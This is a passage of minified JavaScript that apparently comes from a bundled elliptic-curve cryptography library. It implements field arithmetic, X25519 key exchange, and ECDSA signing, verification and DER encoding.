t=(r.ORDER+Go)/Nre,i=r.pow(e,t);if(!r.eql(r.sqr(i),e))throw new Error("Cannot find square root");return i}function bFe(r,e){const t=(r.ORDER-Pre)/$re,i=r.mul(e,I1),n=r.pow(i,t),s=r.mul(e,n),o=r.mul(r.mul(s,I1),n),a=r.mul(s,r.sub(o,r.ONE));if(!r.eql(r.sqr(a),e))throw new Error("Cannot find square root");return a}function vFe(r){if(r<BigInt(3))throw new Error("sqrt is not defined for small field");let e=r-Go,t=0;for(;e%I1===Na;)e/=I1,t++;let i=I1;const n=j3(r);for(;uW(n,i)===1;)if(i++>1e3)throw new Error("Cannot find square root: probably non-prime P");if(t===1)return Rre;let s=n.pow(i,e);const o=(e+Go)/I1;return function(a,c){if(a.is0(c))return c;if(uW(a,c)!==1)throw new Error("Cannot find square root");let l=t,u=a.mul(a.ONE,s),d=a.pow(c,e),h=a.pow(c,o);for(;!a.eql(d,a.ONE);){if(a.is0(d))return a.ZERO;let f=1,p=a.sqr(d);for(;!a.eql(p,a.ONE);)if(f++,p=a.sqr(p),f===l)throw new Error("Cannot find square root");const g=Go<<BigInt(l-f-1),w=a.pow(u,g);l=f,u=a.sqr(w),d=a.mul(d,u),h=a.mul(h,w)}return h}}function yFe(r){return r%Nre===wFe?Rre:r%$re===Pre?bFe:vFe(r)}const xFe=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function CFe(r){const e={ORDER:"bigint",MASK:"bigint",BYTES:"number",BITS:"number"},t=xFe.reduce((i,n)=>(i[n]="function",i),e);return XC(r,t),r}function EFe(r,e,t){if(t<Na)throw new Error("invalid exponent, negatives unsupported");if(t===Na)return r.ONE;if(t===Go)return e;let i=r.ONE,n=e;for(;t>Na;)t&Go&&(i=r.mul(i,n)),n=r.sqr(n),t>>=Go;return i}function Ore(r,e,t=!1){const i=new Array(e.length).fill(t?r.ZERO:void 0),n=e.reduce((o,a,c)=>r.is0(a)?o:(i[c]=o,r.mul(o,a)),r.ONE),s=r.inv(n);return e.reduceRight((o,a,c)=>r.is0(a)?o:(i[c]=r.mul(o,i[c]),r.mul(o,a)),s),i}function uW(r,e){const t=(r.ORDER-Go)/I1,i=r.pow(e,t),n=r.eql(i,r.ONE),s=r.eql(i,r.ZERO),o=r.eql(i,r.neg(r.ONE));if(!n&&!s&&!o)throw new Error("invalid Legendre symbol result");return n?1:s?0:-1}function _Fe(r,e){e!==void 0&&y0(e);const t=e!==void 0?e:r.toString(2).length,i=Math.ceil(t/8);return{nBitLength:t,nByteLength:i}}function j3(r,e,t=!1,i={}){if(r<=Na)throw new Error("invalid field: expected ORDER > 0, got "+r);let n,s;if(typeof e=="object"&&e!=null){if(i.sqrt||t)throw new Error("cannot specify opts in two arguments");const u=e;u.BITS&&(n=u.BITS),u.sqrt&&(s=u.sqrt),typeof u.isLE=="boolean"&&(t=u.isLE)}else typeof e=="number"&&(n=e),i.sqrt&&(s=i.sqrt);const{nBitLength:o,nByteLength:a}=_Fe(r,n);if(a>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let c;const l=Object.freeze({ORDER:r,isLE:t,BITS:o,BYTES:a,MASK:QC(o),ZERO:Na,ONE:Go,create:u=>Qc(u,r),isValid:u=>{if(typeof u!="bigint")throw new Error("invalid field element: expected bigint, got "+typeof u);return Na<=u&&u<r},is0:u=>u===Na,isValidNot0:u=>!l.is0(u)&&l.isValid(u),isOdd:u=>(u&Go)===Go,neg:u=>Qc(-u,r),eql:(u,d)=>u===d,sqr:u=>Qc(u*u,r),add:(u,d)=>Qc(u+d,r),sub:(u,d)=>Qc(u-d,r),mul:(u,d)=>Qc(u*d,r),pow:(u,d)=>EFe(l,u,d),div:(u,d)=>Qc(u*lW(d,r),r),sqrN:u=>u*u,addN:(u,d)=>u+d,subN:(u,d)=>u-d,mulN:(u,d)=>u*d,inv:u=>lW(u,r),sqrt:s||(u=>(c||(c=yFe(r)),c(l,u))),toBytes:u=>t?NO(u,a):kO(u,a),fromBytes:u=>{if(u.length!==a)throw new Error("Field.fromBytes: expected "+a+" bytes, got "+u.length);return t?Q7(u):JC(u)},invertBatch:u=>Ore(l,u),cmov:(u,d,h)=>h?d:u});return Object.freeze(l)}function Bre(r){if(typeof r!="bigint")throw new Error("field order must be bigint");const e=r.toString(2).length;return Math.ceil(e/8)}function Mre(r){const e=Bre(r);return e+Math.ceil(e/2)}function SFe(r,e,t=!1){const i=r.length,n=Bre(e),s=Mre(e);if(i<16||i<s||i>1024)throw new Error("expected "+s+"-1024 bytes of input, got "+i);const o=t?Q7(r):JC(r),a=Qc(o,e-Go)+Go;return t?NO(a,n):kO(a,n)}const Jw=BigInt(0),T1=BigInt(1);function L5(r,e){const t=e.negate();return r?t:e}function AFe(r,e,t){const i=s=>s.pz,n=Ore(r.Fp,t.map(i));return t.map((s,o)=>s.toAffine(n[o])).map(r.fromAffine)}function Dre(r,e){if(!Number.isSafeInteger(r)||r<=0||r>e)throw new Error("invalid window size, expected [1.."+e+"], got W="+r)}function aI(r,e){Dre(r,e);const t=Math.ceil(e/r)+1,i=2**(r-1),n=2**r,s=QC(r),o=BigInt(r);return{windows:t,windowSize:i,mask:s,maxNumber:n,shiftBy:o}}function dW(r,e,t){const{windowSize:i,mask:n,maxNumber:s,shiftBy:o}=t;let a=Number(r&n),c=r>>o;a>i&&(a-=s,c+=T1);const l=e*i,u=l+Math.abs(a)-1,d=a===0,h=a<0,f=e%2!==0;return{nextN:c,offset:u,isZero:d,isNeg:h,isNegF:f,offsetF:l}}function IFe(r,e){if(!Array.isArray(r))throw new Error("array expected");r.forEach((t,i)=>{if(!(t instanceof e))throw new Error("invalid point at index "+i)})}function TFe(r,e){if(!Array.isArray(r))throw new Error("array of scalars expected");r.forEach((t,i)=>{if(!e.isValid(t))throw new Error("invalid scalar at index "+i)})}const cI=new WeakMap,Lre=new WeakMap;function lI(r){return Lre.get(r)||1}function hW(r){if(r!==Jw)throw new Error("invalid wNAF")}function kFe(r,e){return{constTimeNegate:L5,hasPrecomputes(t){return lI(t)!==1},unsafeLadder(t,i,n=r.ZERO){let s=t;for(;i>Jw;)i&T1&&(n=n.add(s)),s=s.double(),i>>=T1;return n},precomputeWindow(t,i){const{windows:n,windowSize:s}=aI(i,e),o=[];let a=t,c=a;for(let l=0;l<n;l++){c=a,o.push(c);for(let u=1;u<s;u++)c=c.add(a),o.push(c);a=c.double()}return o},wNAF(t,i,n){let s=r.ZERO,o=r.BASE;const a=aI(t,e);for(let c=0;c<a.windows;c++){const{nextN:l,offset:u,isZero:d,isNeg:h,isNegF:f,offsetF:p}=dW(n,c,a);n=l,d?o=o.add(L5(f,i[p])):s=s.add(L5(h,i[u]))}return hW(n),{p:s,f:o}},wNAFUnsafe(t,i,n,s=r.ZERO){const o=aI(t,e);for(let a=0;a<o.windows&&n!==Jw;a++){const{nextN:c,offset:l,isZero:u,isNeg:d}=dW(n,a,o);if(n=c,!u){const h=i[l];s=s.add(d?h.negate():h)}}return hW(n),s},getPrecomputes(t,i,n){let s=cI.get(i);return s||(s=this.precomputeWindow(i,t),t!==1&&(typeof n=="function"&&(s=n(s)),cI.set(i,s))),s},wNAFCached(t,i,n){const s=lI(t);return this.wNAF(s,this.getPrecomputes(s,t,n),i)},wNAFCachedUnsafe(t,i,n,s){const o=lI(t);return o===1?this.unsafeLadder(t,i,s):this.wNAFUnsafe(o,this.getPrecomputes(o,t,n),i,s)},setWindowSize(t,i){Dre(i,e),Lre.set(t,i),cI.delete(t)}}}function NFe(r,e,t,i){let n=e,s=r.ZERO,o=r.ZERO;for(;t>Jw||i>Jw;)t&T1&&(s=s.add(n)),i&T1&&(o=o.add(n)),n=n.double(),t>>=T1,i>>=T1;return{p1:s,p2:o}}function PFe(r,e,t,i){IFe(t,r),TFe(i,e);const n=t.length,s=i.length;if(n!==s)throw new Error("arrays of points and scalars must have equal length");const o=r.ZERO,a=gFe(BigInt(n));let c=1;a>12?c=a-3:a>4?c=a-2:a>0&&(c=2);const l=QC(c),u=new Array(Number(l)+1).fill(o),d=Math.floor((e.BITS-1)/c)*c;let h=o;for(let f=d;f>=0;f-=c){u.fill(o);for(let g=0;g<s;g++){const w=i[g],m=Number(w>>BigInt(f)&l);u[m]=u[m].add(t[g])}let p=o;for(let g=u.length-1,w=o;g>0;g--)w=w.add(u[g]),p=p.add(w);if(h=h.add(p),f!==0)for(let g=0;g<c;g++)h=h.double()}return h}function fW(r,e){if(e){if(e.ORDER!==r)throw new Error("Field.ORDER must match order: Fp == p, Fn == n");return CFe(e),e}else return j3(r)}function $Fe(r,e,t={}){if(!e||typeof e!="object")throw new Error(`expected valid ${r} CURVE object`);for(const o of["p","n","h"]){const a=e[o];if(!(typeof a=="bigint"&&a>Jw))throw new Error(`CURVE.${o} must be positive bigint`)}const i=fW(e.p,t.Fp),n=fW(e.n,t.Fn),s=["Gx","Gy","a","b"];for(const o of s)if(!i.isValid(e[o]))throw new Error(`CURVE.${o} must be valid field element of CURVE.Fp`);return{Fp:i,Fn:n}}BigInt(0),BigInt(1),BigInt(2),BigInt(8);const $b=BigInt(0),V2=BigInt(1),p8=BigInt(2);function RFe(r){return XC(r,{adjustScalarBytes:"function",powPminus2:"function"}),Object.freeze({...r})}function OFe(r){const e=RFe(r),{P:t,type:i,adjustScalarBytes:n,powPminus2:s,randomBytes:o}=e,a=i==="x25519";if(!a&&i!=="x448")throw new Error("invalid type");const c=o||U3,l=a?255:448,u=a?32:56,d=BigInt(a?9:5),h=BigInt(a?121665:39081),f=a?p8**BigInt(254):p8**BigInt(447),p=a?BigInt(8)*p8**BigInt(251)-V2:BigInt(4)*p8**BigInt(445)-V2,g=f+p+V2,w=N=>Qc(N,t),m=x(d);function x(N){return NO(w(N),u)}function S(N){const L=va("u coordinate",N,u);return a&&(L[31]&=127),w(Q7(L))}function T(N){return Q7(n(va("scalar",N,u)))}function k(N,L){const $=C(S(L),T(N));if($===$b)throw new Error("invalid private or public key received");return x($)}function I(N){return k(N,m)}function E(N,L,$){const y=w(N*(L-$));return L=w(L-y),$=w($+y),{x_2:L,x_3:$}}function C(N,L){PN("u",N,$b,t),PN("scalar",L,f,g);const $=L,y=N;let A=V2,b=$b,v=N,_=V2,O=$b;for(let R=BigInt(l-1);R>=$b;R--){const P=$>>R&V2;O^=P,{x_2:A,x_3:v}=E(O,A,v),{x_2:b,x_3:_}=E(O,b,_),O=P;const B=A+b,M=w(B*B),W=A-b,K=w(W*W),q=M-K,J=v+_,le=v-_,ae=w(le*B),U=w(J*W),G=ae+U,Z=ae-U;v=w(G*G),_=w(y*w(Z*Z)),A=w(M*K),b=w(q*(M+w(h*q)))}({x_2:A,x_3:v}=E(O,A,v)),{x_2:b,x_3:_}=E(O,b,_);const D=s(b);return w(A*D)}return{scalarMult:k,scalarMultBase:I,getSharedSecret:(N,L)=>k(N,L),getPublicKey:N=>I(N),utils:{randomPrivateKey:()=>c(u)},GuBytes:m.slice()}}BigInt(0);const BFe=BigInt(1),pW=BigInt(2),MFe=BigInt(3),DFe=BigInt(5);BigInt(8);const Ure={p:BigInt("0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffed"),n:BigInt("0x1000000000000000000000000000000014def9dea2f79cd65812631a5cf5d3ed"),a:BigInt("0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffec"),d:BigInt("0x52036cee2b6ffe738cc740797779e89800700a4d4141d8ab75eb4dca135978a3"),Gx:BigInt("0x216936d3cd6e53fec0a4e231fdd6dc5c692cc7609525a7b2c9562d608f25d51a"),Gy:BigInt("0x6666666666666666666666666666666666666666666666666666666666666658")};function LFe(r){const e=BigInt(10),t=BigInt(20),i=BigInt(40),n=BigInt(80),s=Ure.p,o=r*r%s*r%s,a=Ql(o,pW,s)*o%s,c=Ql(a,BFe,s)*r%s,l=Ql(c,DFe,s)*c%s,u=Ql(l,e,s)*l%s,d=Ql(u,t,s)*u%s,h=Ql(d,i,s)*d%s,f=Ql(h,n,s)*h%s,p=Ql(f,n,s)*h%s,g=Ql(p,e,s)*l%s;return{pow_p_5_8:Ql(g,pW,s)*r%s,b2:o}}function UFe(r){return r[0]&=248,r[31]&=127,r[31]|=64,r}const $N=(()=>{const r=Ure.p;return OFe({P:r,type:"x25519",powPminus2:e=>{const{pow_p_5_8:t,b2:i}=LFe(e);return Qc(Ql(t,MFe,r)*i,r)},adjustScalarBytes:UFe})})();function gW(r){r.lowS!==void 0&&J7("lowS",r.lowS),r.prehash!==void 0&&J7("prehash",r.prehash)}let jFe=class extends Error{constructor(e=""){super(e)}};const jh={Err:jFe,_tlv:{encode:(r,e)=>{const{Err:t}=jh;if(r<0||r>256)throw new t("tlv.encode: wrong tag");if(e.length&1)throw new t("tlv.encode: unpadded data");const i=e.length/2,n=f8(i);if(n.length/2&128)throw new t("tlv.encode: long form length too big");const s=i>127?f8(n.length/2|128):"";return f8(r)+s+n+e},decode(r,e){const{Err:t}=jh;let i=0;if(r<0||r>256)throw new t("tlv.encode: wrong tag");if(e.length<2||e[i++]!==r)throw new t("tlv.decode: wrong tlv");const n=e[i++],s=!!(n&128);let o=0;if(!s)o=n;else{const c=n&127;if(!c)throw new t("tlv.decode(long): indefinite length not supported");if(c>4)throw new t("tlv.decode(long): byte length is too big");const l=e.subarray(i,i+c);if(l.length!==c)throw new t("tlv.decode: length bytes not complete");if(l[0]===0)throw new t("tlv.decode(long): zero leftmost byte");for(const u of l)o=o<<8|u;if(i+=c,o<128)throw new t("tlv.decode(long): not minimal encoding")}const a=e.subarray(i,i+o);if(a.length!==o)throw new t("tlv.decode: wrong value length");return{v:a,l:e.subarray(i+o)}}},_int:{encode(r){const{Err:e}=jh;if(r<U5)throw new e("integer: negative integers are not allowed");let t=f8(r);if(Number.parseInt(t[0],16)&8&&(t="00"+t),t.length&1)throw new e("unexpected DER parsing assertion: unpadded hex");return t},decode(r){const{Err:e}=jh;if(r[0]&128)throw new e("invalid signature integer: negative");if(r[0]===0&&!(r[1]&128))throw new e("invalid signature integer: unnecessary leading zero");return JC(r)}},toSig(r){const{Err:e,_int:t,_tlv:i}=jh,n=va("signature",r),{v:s,l:o}=i.decode(48,n);if(o.length)throw new e("invalid signature: left bytes after parsing");const{v:a,l:c}=i.decode(2,s),{v:l,l:u}=i.decode(2,c);if(u.length)throw new e("invalid signature: left bytes after parsing");return{r:t.decode(a),s:t.decode(l)}},hexFromSig(r){const{_tlv:e,_int:t}=jh,i=e.encode(2,t.encode(r.r)),n=e.encode(2,t.encode(r.s)),s=i+n;return e.encode(48,s)}},U5=BigInt(0),j5=BigInt(1),FFe=BigInt(2),g8=BigInt(3),qFe=BigInt(4);function zFe(r,e,t){function i(n){const s=r.sqr(n),o=r.mul(s,n);return r.add(r.add(o,r.mul(n,e)),t)}return i}function jre(r,e,t){const{BYTES:i}=r;function n(s){let o;if(typeof s=="bigint")o=s;else{let a=va("private key",s);if(e){if(!e.includes(a.length*2))throw new Error("invalid private key");const c=new Uint8Array(i);c.set(a,c.length-a.length),a=c}try{o=r.fromBytes(a)}catch{throw new Error(`invalid private key: expected ui8a of size ${i}, got ${typeof s}`)}}if(t&&(o=r.create(o)),!r.isValidNot0(o))throw new Error("invalid private key: out of range [1..N-1]");return o}return n}function WFe(r,e={}){const{Fp:t,Fn:i}=$Fe("weierstrass",r,e),{h:n,n:s}=r;XC(e,{},{allowInfinityPoint:"boolean",clearCofactor:"function",isTorsionFree:"function",fromBytes:"function",toBytes:"function",endo:"object",wrapPrivateKey:"boolean"});const{endo:o}=e;if(o&&(!t.is0(r.a)||typeof o.beta!="bigint"||typeof o.splitScalar!="function"))throw new Error('invalid endo: expected "beta": bigint and "splitScalar": function');function a(){if(!t.isOdd)throw new Error("compression is not supported: Field does not have .isOdd()")}function c(C,N,L){const{x:$,y}=N.toAffine(),A=t.toBytes($);if(J7("isCompressed",L),L){a();const b=!t.isOdd(y);return A1(Fre(b),A)}else return A1(Uint8Array.of(4),A,t.toBytes(y))}function l(C){dl(C);const N=t.BYTES,L=N+1,$=2*N+1,y=C.length,A=C[0],b=C.subarray(1);if(y===L&&(A===2||A===3)){const v=t.fromBytes(b);if(!t.isValid(v))throw new Error("bad point: is not on curve, wrong x");const _=h(v);let O;try{O=t.sqrt(_)}catch(R){const P=R instanceof Error?": "+R.message:"";throw new Error("bad point: is not on curve, sqrt error"+P)}a();const D=t.isOdd(O);return(A&1)===1!==D&&(O=t.neg(O)),{x:v,y:O}}else if(y===$&&A===4){const v=t.fromBytes(b.subarray(N*0,N*1)),_=t.fromBytes(b.subarray(N*1,N*2));if(!f(v,_))throw new Error("bad point: is not on curve");return{x:v,y:_}}else throw new Error(`bad point: got length ${y}, expected compressed=${L} or uncompressed=${$}`)}const u=e.toBytes||c,d=e.fromBytes||l,h=zFe(t,r.a,r.b);function f(C,N){const L=t.sqr(N),$=h(C);return t.eql(L,$)}if(!f(r.Gx,r.Gy))throw new Error("bad curve params: generator point");const p=t.mul(t.pow(r.a,g8),qFe),g=t.mul(t.sqr(r.b),BigInt(27));if(t.is0(t.add(p,g)))throw new Error("bad curve params: a or b");function w(C,N,L=!1){if(!t.isValid(N)||L&&t.is0(N))throw new Error(`bad point coordinate ${C}`);return N}function m(C){if(!(C instanceof k))throw new Error("ProjectivePoint expected")}const x=cW((C,N)=>{const{px:L,py:$,pz:y}=C;if(t.eql(y,t.ONE))return{x:L,y:$};const A=C.is0();N==null&&(N=A?t.ONE:t.inv(y));const b=t.mul(L,N),v=t.mul($,N),_=t.mul(y,N);if(A)return{x:t.ZERO,y:t.ZERO};if(!t.eql(_,t.ONE))throw new Error("invZ was invalid");return{x:b,y:v}}),S=cW(C=>{if(C.is0()){if(e.allowInfinityPoint&&!t.is0(C.py))return;throw new Error("bad point: ZERO")}const{x:N,y:L}=C.toAffine();if(!t.isValid(N)||!t.isValid(L))throw new Error("bad point: x or y not field elements");if(!f(N,L))throw new Error("bad point: equation left != right");if(!C.isTorsionFree())throw new Error("bad point: not in prime-order subgroup");return!0});function T(C,N,L,$,y){return L=new k(t.mul(L.px,C),L.py,L.pz),N=L5($,N),L=L5(y,L),N.add(L)}class k{constructor(N,L,$){this.px=w("x",N),this.py=w("y",L,!0),this.pz=w("z",$),Object.freeze(this)}static fromAffine(N){const{x:L,y:$}=N||{};if(!N||!t.isValid(L)||!t.isValid($))throw new Error("invalid affine point");if(N instanceof k)throw new Error("projective point not allowed");return t.is0(L)&&t.is0($)?k.ZERO:new k(L,$,t.ONE)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static normalizeZ(N){return AFe(k,"pz",N)}static fromBytes(N){return dl(N),k.fromHex(N)}static fromHex(N){const L=k.fromAffine(d(va("pointHex",N)));return L.assertValidity(),L}static fromPrivateKey(N){const L=jre(i,e.allowedPrivateKeyLengths,e.wrapPrivateKey);return k.BASE.multiply(L(N))}static msm(N,L){return PFe(k,i,N,L)}precompute(N=8,L=!0){return E.setWindowSize(this,N),L||this.multiply(g8),this}_setWindowSize(N){this.precompute(N)}assertValidity(){S(this)}hasEvenY(){const{y:N}=this.toAffine();if(!t.isOdd)throw new Error("Field doesn't support isOdd");return!t.isOdd(N)}equals(N){m(N);const{px:L,py:$,pz:y}=this,{px:A,py:b,pz:v}=N,_=t.eql(t.mul(L,v),t.mul(A,y)),O=t.eql(t.mul($,v),t.mul(b,y));return _&&O}negate(){return new k(this.px,t.neg(this.py),this.pz)}double(){const{a:N,b:L}=r,$=t.mul(L,g8),{px:y,py:A,pz:b}=this;let v=t.ZERO,_=t.ZERO,O=t.ZERO,D=t.mul(y,y),R=t.mul(A,A),P=t.mul(b,b),B=t.mul(y,A);return B=t.add(B,B),O=t.mul(y,b),O=t.add(O,O),v=t.mul(N,O),_=t.mul($,P),_=t.add(v,_),v=t.sub(R,_),_=t.add(R,_),_=t.mul(v,_),v=t.mul(B,v),O=t.mul($,O),P=t.mul(N,P),B=t.sub(D,P),B=t.mul(N,B),B=t.add(B,O),O=t.add(D,D),D=t.add(O,D),D=t.add(D,P),D=t.mul(D,B),_=t.add(_,D),P=t.mul(A,b),P=t.add(P,P),D=t.mul(P,B),v=t.sub(v,D),O=t.mul(P,R),O=t.add(O,O),O=t.add(O,O),new k(v,_,O)}add(N){m(N);const{px:L,py:$,pz:y}=this,{px:A,py:b,pz:v}=N;let _=t.ZERO,O=t.ZERO,D=t.ZERO;const R=r.a,P=t.mul(r.b,g8);let B=t.mul(L,A),M=t.mul($,b),W=t.mul(y,v),K=t.add(L,$),q=t.add(A,b);K=t.mul(K,q),q=t.add(B,M),K=t.sub(K,q),q=t.add(L,y);let J=t.add(A,v);return q=t.mul(q,J),J=t.add(B,W),q=t.sub(q,J),J=t.add($,y),_=t.add(b,v),J=t.mul(J,_),_=t.add(M,W),J=t.sub(J,_),D=t.mul(R,q),_=t.mul(P,W),D=t.add(_,D),_=t.sub(M,D),D=t.add(M,D),O=t.mul(_,D),M=t.add(B,B),M=t.add(M,B),W=t.mul(R,W),q=t.mul(P,q),M=t.add(M,W),W=t.sub(B,W),W=t.mul(R,W),q=t.add(q,W),B=t.mul(M,q),O=t.add(O,B),B=t.mul(J,q),_=t.mul(K,_),_=t.sub(_,B),B=t.mul(K,M),D=t.mul(J,D),D=t.add(D,B),new k(_,O,D)}subtract(N){return this.add(N.negate())}is0(){return this.equals(k.ZERO)}multiply(N){const{endo:L}=e;if(!i.isValidNot0(N))throw new Error("invalid scalar: out of range");let $,y;const A=b=>E.wNAFCached(this,b,k.normalizeZ);if(L){const{k1neg:b,k1:v,k2neg:_,k2:O}=L.splitScalar(N),{p:D,f:R}=A(v),{p:P,f:B}=A(O);y=R.add(B),$=T(L.beta,D,P,b,_)}else{const{p:b,f:v}=A(N);$=b,y=v}return k.normalizeZ([$,y])[0]}multiplyUnsafe(N){const{endo:L}=e,$=this;if(!i.isValid(N))throw new Error("invalid scalar: out of range");if(N===U5||$.is0())return k.ZERO;if(N===j5)return $;if(E.hasPrecomputes(this))return this.multiply(N);if(L){const{k1neg:y,k1:A,k2neg:b,k2:v}=L.splitScalar(N),{p1:_,p2:O}=NFe(k,$,A,v);return T(L.beta,_,O,y,b)}else return E.wNAFCachedUnsafe($,N)}multiplyAndAddUnsafe(N,L,$){const y=this.multiplyUnsafe(L).add(N.multiplyUnsafe($));return y.is0()?void 0:y}toAffine(N){return x(this,N)}isTorsionFree(){const{isTorsionFree:N}=e;return n===j5?!0:N?N(k,this):E.wNAFCachedUnsafe(this,s).is0()}clearCofactor(){const{clearCofactor:N}=e;return n===j5?this:N?N(k,this):this.multiplyUnsafe(n)}toBytes(N=!0){return J7("isCompressed",N),this.assertValidity(),u(k,this,N)}toRawBytes(N=!0){return this.toBytes(N)}toHex(N=!0){return Ay(this.toBytes(N))}toString(){return`<Point ${this.is0()?"ZERO":this.toHex()}>`}}k.BASE=new k(r.Gx,r.Gy,t.ONE),k.ZERO=new k(t.ZERO,t.ONE,t.ZERO),k.Fp=t,k.Fn=i;const I=i.BITS,E=kFe(k,e.endo?Math.ceil(I/2):I);return k}function Fre(r){return Uint8Array.of(r?2:3)}function HFe(r,e,t={}){XC(e,{hash:"function"},{hmac:"function",lowS:"boolean",randomBytes:"function",bits2int:"function",bits2int_modN:"function"});const i=e.randomBytes||U3,n=e.hmac||(($,...y)=>ZC(e.hash,$,A1(...y))),{Fp:s,Fn:o}=r,{ORDER:a,BITS:c}=o;function l($){const y=a>>j5;return $>y}function u($){return l($)?o.neg($):$}function d($,y){if(!o.isValidNot0(y))throw new Error(`invalid signature ${$}: out of range 1..CURVE.n`)}class h{constructor(y,A,b){d("r",y),d("s",A),this.r=y,this.s=A,b!=null&&(this.recovery=b),Object.freeze(this)}static fromCompact(y){const A=o.BYTES,b=va("compactSignature",y,A*2);return new h(o.fromBytes(b.subarray(0,A)),o.fromBytes(b.subarray(A,A*2)))}static fromDER(y){const{r:A,s:b}=jh.toSig(va("DER",y));return new h(A,b)}assertValidity(){}addRecoveryBit(y){return new h(this.r,this.s,y)}recoverPublicKey(y){const A=s.ORDER,{r:b,s:v,recovery:_}=this;if(_==null||![0,1,2,3].includes(_))throw new Error("recovery id invalid");if(a*FFe<A&&_>1)throw new Error("recovery id is ambiguous for h>1 curve");const O=_===2||_===3?b+a:b;if(!s.isValid(O))throw new Error("recovery id 2 or 3 invalid");const D=s.toBytes(O),R=r.fromHex(A1(Fre((_&1)===0),D)),P=o.inv(O),B=S(va("msgHash",y)),M=o.create(-B*P),W=o.create(v*P),K=r.BASE.multiplyUnsafe(M).add(R.multiplyUnsafe(W));if(K.is0())throw new Error("point at infinify");return K.assertValidity(),K}hasHighS(){return l(this.s)}normalizeS(){return this.hasHighS()?new h(this.r,o.neg(this.s),this.recovery):this}toBytes(y){if(y==="compact")return A1(o.toBytes(this.r),o.toBytes(this.s));if(y==="der")return SO(jh.hexFromSig(this));throw new Error("invalid format")}toDERRawBytes(){return this.toBytes("der")}toDERHex(){return Ay(this.toBytes("der"))}toCompactRawBytes(){return this.toBytes("compact")}toCompactHex(){return Ay(this.toBytes("compact"))}}const f=jre(o,t.allowedPrivateKeyLengths,t.wrapPrivateKey),p={isValidPrivateKey($){try{return f($),!0}catch{return!1}},normPrivateKeyToScalar:f,randomPrivateKey:()=>{const $=a;return SFe(i(Mre($)),$)},precompute($=8,y=r.BASE){return y.precompute($,!1)}};function g($,y=!0){return r.fromPrivateKey($).toBytes(y)}function w($){if(typeof $=="bigint")return!1;if($ instanceof r)return!0;const y=va("key",$).length,A=s.BYTES,b=A+1,v=2*A+1;if(!(t.allowedPrivateKeyLengths||o.BYTES===b))return y===b||y===v}function m($,y,A=!0){if(w($)===!0)throw new Error("first arg must be private key");if(w(y)===!1)throw new Error("second arg must be public key");return r.fromHex(y).multiply(f($)).toBytes(A)}const x=e.bits2int||function($){if($.length>8192)throw new Error("input is too large");const y=JC($),A=$.length*8-c;return A>0?y>>BigInt(A):y},S=e.bits2int_modN||function($){return o.create(x($))},T=QC(c);function k($){return PN("num < 2^"+c,$,U5,T),o.toBytes($)}function I($,y,A=E){if(["recovered","canonical"].some(K=>K in A))throw new Error("sign() legacy options not supported");const{hash:b}=e;let{lowS:v,prehash:_,extraEntropy:O}=A;v==null&&(v=!0),$=va("msgHash",$),gW(A),_&&($=va("prehashed msgHash",b($)));const D=S($),R=f(y),P=[k(R),k(D)];if(O!=null&&O!==!1){const K=O===!0?i(s.BYTES):O;P.push(va("extraEntropy",K))}const B=A1(...P),M=D;function W(K){const q=x(K);if(!o.isValidNot0(q))return;const J=o.inv(q),le=r.BASE.multiply(q).toAffine(),ae=o.create(le.x);if(ae===U5)return;const U=o.create(J*o.create(M+ae*R));if(U===U5)return;let G=(le.x===ae?0:2)|Number(le.y&j5),Z=U;return v&&l(U)&&(Z=u(U),G^=1),new h(ae,Z,G)}return{seed:B,k2sig:W}}const E={lowS:e.lowS,prehash:!1},C={lowS:e.lowS,prehash:!1};function N($,y,A=E){const{seed:b,k2sig:v}=I($,y,A);return mFe(e.hash.outputLen,o.BYTES,n)(b,v)}r.BASE.precompute(8);function L($,y,A,b=C){const v=$;y=va("msgHash",y),A=va("publicKey",A),gW(b);const{lowS:_,prehash:O,format:D}=b;if("strict"in b)throw new Error("options.strict was renamed to lowS");if(D!==void 0&&!["compact","der","js"].includes(D))throw new Error('format must be "compact", "der" or "js"');const R=typeof v=="string"||CO(v),P=!R&&!D&&typeof v=="object"&&v!==null&&typeof v.r=="bigint"&&typeof v.s=="bigint";if(!R&&!P)throw new Error("invalid signature, expected Uint8Array, hex string or Signature instance");let B,M;try{if(P)if(D===void 0||D==="js")B=new h(v.r,v.s);else throw new Error("invalid format");if(R){try{D!=="compact"&&(B=h.fromDER(v))}catch(G){if(!(G instanceof jh.Err))throw G}!B&&D!=="der"&&(B=h.fromCompact(v))}M=r.fromHex(A)}catch{return!1}if(!B||_&&B.hasHighS())return!1;O&&(y=e.hash(y));const{r:W,s:K}=B,q=S(y),J=o.inv(K),le=o.create(q*J),ae=o.create(W*J),U=r.BASE.multiplyUnsafe(le).add(M.multiplyUnsafe(ae));return U.is0()?!1:o.create(U.x)===W}return Object.freeze({getPublicKey:g,getSharedSecret:m,sign:N,verify:L,utils:p,Point:r,Signature:h})}function VFe(r){const e={a:r.a,b:r.b,p:r.Fp.ORDER,n:r.n,h:r.h,Gx:r.Gx,Gy:r.Gy},t=r.Fp,i=j3(e.n,r.nBitLength),n={Fp:t,Fn:i,allowedPrivateKeyLengths:r.allowedPrivateKeyLengths,allowInfinityPoint:r.allowInfinityPoint,endo:r.endo,wrapPrivateKey:r.wrapPrivateKey,isTorsionFree:r.isTorsionFree,clearCofactor:r.clearCofactor,fromBytes:r.fromBytes,toBytes:r.toBytes};return{CURVE:e,curveOpts:n}}function KFe(r){const{CURVE:e,curveOpts:t}=VFe(r),i={hash:r.hash,hmac:r.hmac,randomBytes:r.randomBytes,lowS:r.lowS,bits2int:r.bits2int,bits2int_modN:r.bits2int_modN};return{CURVE:e,curveOpts:t,ecdsaOpts:i}}function GFe(r,e){return Object.assign({},e,{ProjectivePoint:e.Point,CURVE:r})}function ZFe(r){const{CURVE:e,curveOpts:t,ecdsaOpts:i}=KFe(r),n=WFe(e,t),s=HFe(n,i,t);return GFe(r,s)}function RN(r,e){const t=i=>ZFe({...r,hash:i});return{...t(e),create:t}}const 